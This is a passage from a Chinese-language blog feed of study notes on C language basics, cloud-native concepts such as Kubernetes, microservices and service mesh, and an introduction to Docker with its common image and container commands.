here...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dancer say:\&quot; 今天是 %d 号 \n&quot;</span>,CLASSNUMBER);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h5><p>​    标识符是用户编程时通过 C 语言的字符为变量以及函数等指定的名字。我们制定某个东西，都要用到它的名字；在数学中解释方程时，我们也常常用到这样那样的变量名或函数名。</p><p>​    标识符定义规则：字母数字下划线组成，首字母不能是数字，一般小写开头，特殊的除外，不能取名与关键字相同。</p><h5 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h5><p>​    在 C 中保留又称关键字，它们是系统已经预先定义好的词，在 C 语言中，有着特殊的含义。</p><p>​    可分其为数据类型关键字，控制语句关键字，存储类型关键字和其他关键字四类。</p><p>​    数据类型关键字：char(2)double(3)enum(4)float(5)int(6)long(7)short(8)signed(9)struct(10)union（11）unsigned(12)void</p><p>​    控制语句关键字：</p><p>for(2)do(3)while(4)break(5)break(6)if(7)else(8)goto(9)switch(10)case(11)default(12)return</p><p>​    存储类型关键字:</p><p>auto(2)extern(3)register(4)static</p><p>​    其他关键字：</p><p>const(2)sizeof(3)typedef(4)volatile</p><h5 id="格式化输入输出"><a href="#格式化输入输出" class="headerlink" title="格式化输入输出"></a>格式化输入输出</h5><p>​    格式化输入函数：scanf</p><p>​    从标准输入流中获取参数值，实现标准化输入。用scanf()读取基本变量类型的值，在变量名前加＆scanf(“%d%d”,&amp;a,&amp;b);</p><p>​    输入函数的作用：从终端设备内将部分信息通过键盘、鼠标、画笔的方式传入到CPU、电脑中。当我们想将一个数字输入到内存中时，内存中同样也需要一片区域以供我们使用、保留数字的区域，故应定义一个存放数据的变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> num1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> num2 = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num1);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;\n%c&quot;</span>,&amp;num2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num1 = %d&quot;</span>,num1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num2 = %c&quot;</span>,num2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    字符输入：getchar（）</p><p>​    输入字符以回车结束，函数读取回车前的字符</p><p>​    使用方法：char c=getchar();printf(“%c”,getchar());</p><h5 id="格式控制符–格式化输出函数"><a href="#格式控制符–格式化输出函数" class="headerlink" title="格式控制符–格式化输出函数"></a>格式控制符–格式化输出函数</h5><p>​    格式化输出函数：printf</p><p>​    可使用printf（）将数据显示在屏幕上，如：printf (“%d\n”,day) ;</p><p>​    格式：</p><p>​    printf（“‘格式控制字符串”（%d %f %s %c），参数列表…）</p><p>​    以上字符会对不同类型进行相应的输出，用逗号隔开需要输出的参数列表。参数列表即需要打印的数据。可以放多个。而多个参数列表也用逗号隔开。</p><p>​    printf并非与用户交互的工具，是一种调试手段-暴力调试，且仅作为一种调试方式。不管程序对错依然按部就班运，运用时会出现无法规避的问题。此时也可使用另一种断点调试，此调试优于暴力调试，程序会停在错误处。</p><p>​    前期入门时需要了解 printf，但后期几乎不会使用。在后台查看到数据错误时，呈现给用户的同样也是错误值，存在程序崩溃的风险。还有一种断点调试，更优选。优化于暴力调试，会在数据错误处停止，以便于观察到详细错误。可随时监听，便于更改。</p><p>​    %d十进制有符号整数</p><p>​    %u十进制无符号整数</p><p>​    %f浮点数 (单精度)  float</p><p>​    %lf浮点数 (双精度) double</p><p>​    %.5lf显示时保留小数点后5位</p><p>​    %s字符串</p><p>​    %c单个字符</p><p>​    %p指针的值</p><p>​    %e指数形式的浮点数</p><p>​    %x以十六进制表示的整数</p><p>​    %0以八进制表示的整数</p><p>​    %%输出%    </p><hr><h4 id="运算符和表达式"><a href="#运算符和表达式" class="headerlink" title="运算符和表达式"></a>运算符和表达式</h4><h5 id="算术运算符和赋值运算符"><a href="#算术运算符和赋值运算符" class="headerlink" title="算术运算符和赋值运算符"></a>算术运算符和赋值运算符</h5><p>​    略</p><h5 id="自加自减运算符"><a href="#自加自减运算符" class="headerlink" title="自加自减运算符"></a>自加自减运算符</h5><p>​    自增自减运算符只能作用于整形变量以及字符型变量，不能作用于常量或运算表达式</p><h5 id="复合赋值运算符"><a href="#复合赋值运算符" class="headerlink" title="复合赋值运算符"></a>复合赋值运算符</h5><p>​    a+=b，a=a+b</p><p>​    &lt;表达式&gt;？a：b</p><h5 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h5><p>​    优先级从高到低：</p><p>​    ！逻辑  优先级最高</p><p>​    算数运算符</p><p>​    关系运算符:==、&gt;=、&lt;=、!=</p><p>​    逻辑运算符:&amp;&amp;、||、!</p><p>​    赋值</p><h5 id="逗号运算符和sizeof"><a href="#逗号运算符和sizeof" class="headerlink" title="逗号运算符和sizeof"></a>逗号运算符和sizeof</h5><p>​    逗号运算符（又称顺序求值运算符）：可以把表达式链接起来，整个逗号表达式的值为最后一个表达式的值。一般形式为：表达式1，表达式2，表达式3……表达式n（运算结果为表达式n的值）。逗号运算符的优先级是所有运算符中最低的。</p><p>​    sizeof（）运算符：以字节形式给出了其操作数的储存大小。</p><p>​    1.用于数据类型</p><p>​    sizeof使用形式：sizeof（int）</p><p>​    数据类型必须用括号括住：sizeof（char）</p><p>​    2.用于变量</p><p>​    sizeof使用形式：sizeof（a）</p><p>​    sizeof操作符不能用于函数类型，不完全类型或位字段。（不完全类型指具有未知存储大小的数据类型）void</p><p>​    sizeof（）直接参与运算：int i=10；i*sizeof(int)</p><h5 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h5><p>​    当混合不同类型的数据进行计算时，便会发生类型转换。当不同类型的数据进行计算时,应当首先将操作数转换成相同类型数据,然后再进行计算。</p><p>​    转换形式分为:隐式类型转换,显式类型转换。</p><p>​    转换是因为从计算机内存角度来说，整形和浮点内存存储结构是不一样的，计算机必须保证两个数据是一样的才能去运算，所以必须转成一样的。</p><p>​    方法是：低精度向高精度转换，</p><p>​    隐式转换：自动转换，不需要手动转换。</p><p>​    显式转换：浮点转成整数运算。</p><p>​    隐式类型转换:编译器自动完成转</p><p>​    换规则为:由低级向高级转换</p><p>​    隐式类型转换:编译器自动完成。1.短字节向长学节看齐(char int)；2.有符号,向无符号看齐(unside int)；3.整形向浮点型看齐；4.单精度向双精度看齐</p><pre><code> 显式类型转换:又叫强制类型转换,直接将某数据转换为指定类型。直接在要转换的数据前,用括号加需要强制的类型</code></pre><p>​    a=(int)1.6，将1.6强制转换为整形,赋值给ab=c+(int)x将变量的值临时转换为整形，但变量x在系统中的值不变.</p><p>​    比如 a（1.23456）本来是一个浮点，对 a 进行强制转换 （int）a 编译器在处理数据的时候会取变量 a 里面的整数位， 但是a 不会发生变化。</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;没有前言…&lt;/p&gt;
&lt;p&gt;​    面向过程：C；&lt;/p&gt;
&lt;p&gt;​    面向对象：C++，java，C#，objective-c；&lt;/p&gt;
&lt;p&gt;​    C 语言是一种程序设计语言，具有高级语言的特点，有具有低级语言的特点，简洁灵活，使用方便，运用广泛。&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="C语言学习基础篇" scheme="http://example.com/categories/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="C" scheme="http://example.com/tags/C/"/>
    
    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="数据结构" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>K8S &amp;&amp; 云原生?</title>
    <link href="http://example.com/2022/05/18/K8S-%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    <id>http://example.com/2022/05/18/K8S-%E4%BA%91%E5%8E%9F%E7%94%9F/</id>
    <published>2022-05-18T05:56:38.000Z</published>
    <updated>2023-04-15T07:44:20.611Z</updated>
    
    <content type="html"><![CDATA[<p>​    没有前言…</p><h4 id="什么是云原生"><a href="#什么是云原生" class="headerlink" title="什么是云原生"></a>什么是云原生</h4><h5 id="历史的纬度各种模型"><a href="#历史的纬度各种模型" class="headerlink" title="历史的纬度各种模型"></a>历史的纬度各种模型</h5><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074311.jpg"                      alt="image-20220518141410841"                ></p><h5 id="分布式系统"><a href="#分布式系统" class="headerlink" title="分布式系统"></a>分布式系统</h5><p>​    现阶段的分布式应用拥有提升系统容量，加强系统可用性的有点，但也有一些缺点，具体如图：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074312.jpg"                      alt="image-20220518142838270"                ></p><p>​    相对的，为了应对这些不足，出现了以下这些技术手段解决：服务治理（依赖关系、调用链）、架构管理（版本管理、生命周期管理、编排、聚合、调度）、DevOps、自动化运维、资源调度管理、整体架构监控、流量治理（负载均衡、路由、熔断、…）</p><h5 id="创建运行分布式应用的需求"><a href="#创建运行分布式应用的需求" class="headerlink" title="创建运行分布式应用的需求"></a>创建运行分布式应用的需求</h5><p>​    运行分布式应用的典型需求有如下几个类别：1、生命周期管理；2、网络管理；3、状态存储管理；4、绑定（与内部的或者外部的应用集成）</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074313.jpg"                      alt="image-20220518143654823"                ></p><p>​    ESB中间件及其变体是满足这类分布式需求的前一代主流解决方案，它提供良好的功能集。但是，单体架构以及业务逻辑和平台之间紧密的技术耦合会导致的技术和组织的中心化，这个概念与分布式的理念背道而驰。（ESB的工作就是提供和调用集成系统的服务。使用了ESB，在大多情况下，每个系统和ESB之间，只需要定义一个访问方法，一个接口。如果这样，像上面的图一样，你有8个系统，就只有有16个接口（1个方向1个）需要被创建、维护、管理和关注。否则你就需要56个接口需要去思考和处理。（假设每个系统都需要跟其他系统对话），少了40个接口意味着更少的成本。）</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074315.jpg"                      alt="image-20220518151042142"                ></p><h5 id="ESB分布式应用中间件的限制"><a href="#ESB分布式应用中间件的限制" class="headerlink" title="ESB分布式应用中间件的限制"></a>ESB分布式应用中间件的限制</h5><p>​    生命周期:通常只支持的一个语言运行时，( 比如Java)，这就限定了软件该如何打包、哪些库可用、它们打补丁的频率等</p><p>​    网络:集中于一种主要的编程语言及其相关的技术，而且，网络问题和语义也深深地嵌入到了业务服务中，例如，对于Java语言，它就是指JMS、JDBC和JTA等</p><pre><code> 状态:与状态交互的库和接口没有完全抽象出来，也没有与服务运行时完全解耦 绑定:必须根据消息交换模式构造代码和设计流程，连接器必须与应用程序共存的事实意味着，依赖项必须与业务逻辑一起更新和打补丁</code></pre><p>​    <strong>面对这诸多问题，云计算时代的解决方案：基于容器化、容器编排、DevOps、微服务及典型的治理系统服务网格等技术的云原生解决方案。</strong></p><hr><h4 id="云原生的定义"><a href="#云原生的定义" class="headerlink" title="云原生的定义"></a>云原生的定义</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074317.jpg"                      alt="image-20220518152006833"                ></p><p>​    云原生具有以下六大特性：</p><p>​    1、DevOps；2、持续交付(CD)；3、微服务；4、容器化；2018年新增两个特性是：5、服务网格；6、声明式API</p><h5 id="容器技术-Containers-和容器编排"><a href="#容器技术-Containers-和容器编排" class="headerlink" title="容器技术( Containers )和容器编排"></a>容器技术( Containers )和容器编排</h5><p>​    容器技术由来已久，dotCloud (后改名为Docker )公司在Docker项目中发明了“容器镜像”技术之后， 创造性地解决了应用打包的难题才焕发出新的生命力，并以“应用容器”的面目风靡于世。在docker之前基本都是系统容器，可以看做一个轻量级的虚拟机，而应用容器基本只运行单个应用进程及其子进程。如果需要学习docker，可以翻看以前的dockerdocker文章。</p><p>​    <strong>单个容器难以产生价值，容器编排才是根本，Kubernetes是云原生系统的底座</strong></p><p>​    现代应用容器技术和Kubernetes将打包、分发和部署应用程序的方法演化成了与编程语言无关的格式。</p><h5 id="Kubernetes和声明式API"><a href="#Kubernetes和声明式API" class="headerlink" title="Kubernetes和声明式API"></a>Kubernetes和声明式API</h5><p>​    Kubernetes的关键特性：</p><p>​    1、容器编排系统；</p><p>​    2、声明式API</p><p>​    3、“以应用为中心”的现代应用基础设施，纳管各类基础支撑类服务，并经由声明式API向上层应用暴露这些基础设施</p><p>​    4、Platform for Platform类型的系统，根本目标在于方便基础设施工程师构建其它的平台系统，例如Service Mesh或Serverless等。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074318.jpg"                      alt="image-20220518203059254"                ></p><h5 id="微服务-MicroServices"><a href="#微服务-MicroServices" class="headerlink" title="微服务(MicroServices)"></a>微服务(MicroServices)</h5><p>​    微服务是一种流行的架构风格，用于构建弹性化、高度可扩展、可独立部署且能够快速迭代的应用程序，微服务架构由一系列小型自治服务组成，每个服务都是自包含的，应该在有界上下文中实现单个业务功能。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074320.jpg"                      alt="image-20220518204228064"                ></p><h5 id="微服务治理"><a href="#微服务治理" class="headerlink" title="微服务治理"></a>微服务治理</h5><p>​    动态化是云原生应用的天然属性，微服务架构是支撑该目标的关键所在。</p><p>​    服务治理工具，又是支撑微服务运行的根本所在。常见的有：Dubbo、Spring Cloud、ServiceMesh</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74321.jpg"                      alt="image-20220518205139873"                ></p><h5 id="服务网格-ServiceMesh"><a href="#服务网格-ServiceMesh" class="headerlink" title="服务网格(ServiceMesh)"></a>服务网格(ServiceMesh)</h5><p>​    服务网格的定义：1、专用于处理服务通讯的基础设施层；2、负责可靠地完成请求传送，这些请求由复杂拓扑结构下的云原生应用组成服务生成；3、是一组同应用服务协同部署的轻量级网络代理，并且对应用服务透明。</p><p>​    Sidecar连接成网，组成Service Mesh。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074322.jpg"                      alt="image-20220518210349237"                ></p><p>​    在每一个应用实例的外层，添加一个服务代理，来确保受控的服务到服务的通信。</p><h5 id="Sidercar模式"><a href="#Sidercar模式" class="headerlink" title="Sidercar模式"></a>Sidercar模式</h5><p>​    Service Mesh以Sidecar形式，将服务治理从业务逻辑中剥离，并拆解为独立进程，实现异构系统的统治理和网络安全。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074324.jpg"                      alt="image-20220518212108431"                ></p><h5 id="不可变基础设施-immutable-infrastructure-与一次性组件"><a href="#不可变基础设施-immutable-infrastructure-与一次性组件" class="headerlink" title="不可变基础设施( immutable infrastructure)与一次性组件"></a>不可变基础设施( immutable infrastructure)与一次性组件</h5><p>​    不可变基础设施是早在2013年由Chad Fowler在其一篇博客中提出的一个很有的预见性的构想。<strong>其核心思想在于，任何基础设施的实例一旦创建之后即变为只读状态，若需要修改和升级，只能通过替换为新的实例来实现</strong>。传统的服务器(裸金属或虚拟机)支持配置的多次变更，因而通常会导致如下问题。灾难发生时，重新构建较为困难(因手动的变更操作所致)。存在导致状态不一 致的风险。</p><p>​    实现：容器和容器镜像、云端虚拟化组件。</p><hr><h4 id="云原生平台的生态模型"><a href="#云原生平台的生态模型" class="headerlink" title="云原生平台的生态模型"></a>云原生平台的生态模型</h4><h5 id="云原生的一个参考架构示例"><a href="#云原生的一个参考架构示例" class="headerlink" title="云原生的一个参考架构示例"></a>云原生的一个参考架构示例</h5><p>​    五个层级：    </p><p>​    1、基础设施层：主机、存储、网络管理</p><p>​    2、预配层( Provisioning )：主机创建、操作系统安装、存储分配等</p><p>​    3、运行时层：CRI、CNI、CSI</p><p>​    4、容器编排及管理</p><p>​    5、云原生应用程序定义与开发</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074326.jpg"                      alt="image-20220518215723116"                ></p><h5 id="云原生系统的功能特征"><a href="#云原生系统的功能特征" class="headerlink" title="云原生系统的功能特征"></a>云原生系统的功能特征</h5><p>​    动态化是云原生应用的天然属性，微服务架构是支撑该目标的关键所在</p><p>​    各微服务提供的API应该集成为复合的API,通过“API网关”对外提供统一的访问接口，API网关对于安全、监控、计费等也是必不可少的组件。</p><p>​    微服务治理，Istio、 OpenPaaS、Linkerd等</p><pre><code> Serverless，Knative等 各微服务以窗口镜像进行交付 云原生编排平台，调度、运行、健康状态检测、监控，弹性扩缩容 灵活部署:重建、灰度、蓝绿、金丝雀、A/B测试、影子( Shadow)部署</code></pre><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074327.jpg"                      alt="image-20220518222105963"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074329.jpg"                      alt="image-20220518222211004"                ></p><hr><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>ESB：<a class="link"   href="https://zhuanlan.zhihu.com/p/399060480" >https://zhuanlan.zhihu.com/p/399060480<i class="fas fa-external-link-alt"></i></a></p><p>云原生：<a class="link"   href="http://t.zoukankan.com/huaweiyun-p-13181034.html" >http://t.zoukankan.com/huaweiyun-p-13181034.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    没有前言…&lt;/p&gt;
&lt;h4 id=&quot;什么是云原生&quot;&gt;&lt;a href=&quot;#什么是云原生&quot; class=&quot;headerlink&quot; title=&quot;什么是云原生&quot;&gt;&lt;/a&gt;什么是云原生&lt;/h4&gt;&lt;h5 id=&quot;历史的纬度各种模型&quot;&gt;&lt;a href=&quot;#历史的纬度各种模型&quot;</summary>
      
    
    
    
    <category term="K8S学习基础篇" scheme="http://example.com/categories/K8S%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="容器" scheme="http://example.com/tags/%E5%AE%B9%E5%99%A8/"/>
    
    <category term="K8S" scheme="http://example.com/tags/K8S/"/>
    
    <category term="云原生" scheme="http://example.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="云" scheme="http://example.com/tags/%E4%BA%91/"/>
    
  </entry>
  
  <entry>
    <title>DockerDocker😝</title>
    <link href="http://example.com/2022/05/14/DockerDocker%F0%9F%98%9D/"/>
    <id>http://example.com/2022/05/14/DockerDocker%F0%9F%98%9D/</id>
    <published>2022-05-14T14:26:54.000Z</published>
    <updated>2023-04-15T07:44:20.248Z</updated>
    
    <content type="html"><![CDATA[<p>​    dockerdocker🥳</p><h4 id="docker介绍"><a href="#docker介绍" class="headerlink" title="docker介绍"></a>docker介绍</h4><h5 id="docker背景"><a href="#docker背景" class="headerlink" title="docker背景"></a>docker背景</h5><p>​    以前开发和运维部署之间会有因环境问题而产生的分歧，Docker之所以发展的如此迅速，是因为它对此给出了一个标准化的解决方案：安装的时候，将环境也一同复制过来。docker的镜像设计,使得docker得以打破过去的程序及应用的观念。透过镜像讲作业系统核心除外，运作应用程序所需要的系统环境，由下而上打包，达到跨平台无缝运作。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073411.jpg"                      alt="image-20220514224340636"                ></p><h5 id="docker理念"><a href="#docker理念" class="headerlink" title="docker理念"></a>docker理念</h5><p>​    Docker基于go语言实现，基于Linux的容器技术发展过来，只要配置好一次环境，换到其他的机器上一键部署好，大大简化了操作。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073412.jpg"                      alt="image-20220514232318158"                ></p><h5 id="docker要素"><a href="#docker要素" class="headerlink" title="docker要素"></a>docker要素</h5><p>​    之前的虚拟化技术：虚拟机技术，在操作系统里面运行操作系统，缺点是开启时间长，容量大。</p><p>​    因为这些缺点：Linux发展出另一种虚拟化技术:Linux容器。Linux容器不是模拟一个完整的操作系统，而是对进程进行隔离。有了容器，就可以将软件所需要的所有资源打包到一个隔离的容器中。容器与虚拟机不同，不需要捆绑操作系统，只需要软件工作所需的资源库和设置。系统因此高效轻量并且在任何环境中都可以始终如一的运行。</p><p>​    Docker特征：1、镜像；2、容器；3、仓库。</p><p>​    Docker特点：1、容器的应用进程直接运行于宿主的内核，容器内没有自己的内核,并且也没有进行硬件虚拟；2、每个容器之间相互隔离，每个容器有自己的文件系统，容器进程不会相互影响，能区分计算资源。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073413.jpg"                      alt="image-20220515000124724"                ></p><p>​    Docker镜像（Image）就是一个<strong>只读</strong>的模版。镜像可以用来创建docker容器，一个镜像可以创建很多容器。</p><p>​    容器与镜像的关系类似于面向对象编程中的对象于类。</p><table><thead><tr><th>Docker</th><th>面向对象</th></tr></thead><tbody><tr><td>容器</td><td>对象</td></tr><tr><td>镜像</td><td>类</td></tr></tbody></table><p>​    Docker利用容器（Container）独立运行的一个或一组应用。容器使用镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。可以把容器看作一个简易版的Linux环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。容器的定义和镜像很像，唯一区别在于容器最上面那一层是可读可写的。</p><p>​    Docker仓库(Repository)是集中存放镜像文件的场所。仓库分为公开仓库和私有仓库。</p><hr><h4 id="Docker相关"><a href="#Docker相关" class="headerlink" title="Docker相关"></a>Docker相关</h4><h5 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h5><p>​    安装方式：<a class="link"   href="https://developer.aliyun.com/article/765545" >https://developer.aliyun.com/article/765545<i class="fas fa-external-link-alt"></i></a></p><h5 id="Docker运行底层"><a href="#Docker运行底层" class="headerlink" title="Docker运行底层"></a>Docker运行底层</h5><p>​    Docker是一个C/S结构的系统，Docker守护进程运行在主机上，然后通过Socket链接从客户端访问，守护进程从客户端接收命令并管理运行在主机上的容器。<strong>容器是一个运行时环境</strong>。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073415.jpg"                      alt="image-20220515005117295"                ></p><p>​    docker有着比虚拟机更少的抽象层，docker不需要hypervisor实现硬件虚拟化，docker使用的都是实际物理机器的资源。</p><p>​    docker利用的是宿主机的内核，而不需要Guest OS。因此当新建一个容器时，docker不需要和虚拟机一样重新加载一个操作系统内核。而新建虚拟机需要加载这个，这个是分钟级别的。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073416.jpg"                      alt="image-20220515005340182"                ></p><hr><h4 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h4><h5 id="docker帮助命令"><a href="#docker帮助命令" class="headerlink" title="docker帮助命令"></a>docker帮助命令</h5><p>​    docker version、docker info、docker –help</p><h5 id="docker镜像命令"><a href="#docker镜像命令" class="headerlink" title="docker镜像命令"></a>docker镜像命令</h5><p>​    docker images：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker images //列出本地所有镜像</span><br><span class="line">docker images -a //列出本地所有镜像（含中间映像层）</span><br><span class="line">docker images -q //只显示镜像ID</span><br><span class="line">docker images --digests //显示镜像的摘要信息</span><br><span class="line">docker images --no-trunc //显示完整的镜像信息</span><br></pre></td></tr></table></figure><p>​    docker search：</p><p>​    方法一：dockerhub网站</p><p>​    方法二：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search tomcat //查询镜像</span><br><span class="line">docker search --no-trunc tomcat //显示完整信息</span><br></pre></td></tr></table></figure><p>​    docker pull：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tomcat:latest</span><br></pre></td></tr></table></figure><p>​    docker rmi：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker rmi tomcat:latest</span><br><span class="line">docker rmi -f tomcat:latest</span><br><span class="line">docker rmi -f tomcat nginx</span><br><span class="line">docker rmi -f $(docker images -qa)//全删</span><br></pre></td></tr></table></figure><h5 id="docker容器命令"><a href="#docker容器命令" class="headerlink" title="docker容器命令"></a>docker容器命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">docker run [options] image [<span class="built_in">command</span>][arg...]</span><br><span class="line">options选项：</span><br><span class="line">--name=<span class="string">&#x27;容器新名字&#x27;</span>：为容器指定一个名称</span><br><span class="line">-d：后台运行容器，并返回容器ID，也即启动守护式容器</span><br><span class="line">-i：以交互模式运行容器，通常与-t同时使用</span><br><span class="line">-t：为容器重新分配一个伪输入终端，通常与-i同时使用</span><br><span class="line">-P（大写）：随机端口映射</span><br><span class="line">-p：指定端口映射，有以下模式：</span><br><span class="line">ip:hostPort:containerPort</span><br><span class="line">ip::containerPort</span><br><span class="line">hostPort:containPort</span><br><span class="line">containerPort</span><br><span class="line"></span><br><span class="line">docker run -it centos//启动并提供交互进入容器</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker ps [OPTIONS]</span><br><span class="line">options选项：</span><br><span class="line">-a：列出当前所有正在运行的容器+历史上运行过的</span><br><span class="line">-l：显示最近创建的容器</span><br><span class="line">-n：显示最近n个创建的容器</span><br><span class="line">-q：静默模式，只显示容器编号</span><br><span class="line">--no-trunc：不截断输出</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> 容器停止推出</span><br><span class="line">ctrl+P+Q 不停止</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器名或<span class="built_in">id</span></span><br><span class="line">docker stop 容器名或<span class="built_in">id</span></span><br><span class="line">docker <span class="built_in">kill</span> 容器名或<span class="built_in">id</span>，强制</span><br><span class="line">docker <span class="built_in">rm</span> 容器名或<span class="built_in">id</span></span><br><span class="line">docker <span class="built_in">rm</span> -f 容器名或<span class="built_in">id</span>，强制</span><br><span class="line">docker <span class="built_in">rm</span> -f $(docker ps -a -q)</span><br><span class="line">docker ps -a -q | xargs docker <span class="built_in">rm</span></span><br></pre></td></tr></table></figure><p>​    注意：docker run -d 镜像这样的启动方式在docker ps是查询不出来的</p><p>​    此时我们使用docker ps  -l查看，会发现容器已经退出了</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073417.jpg"                      alt="image-20220515203346061"                ></p><p>​    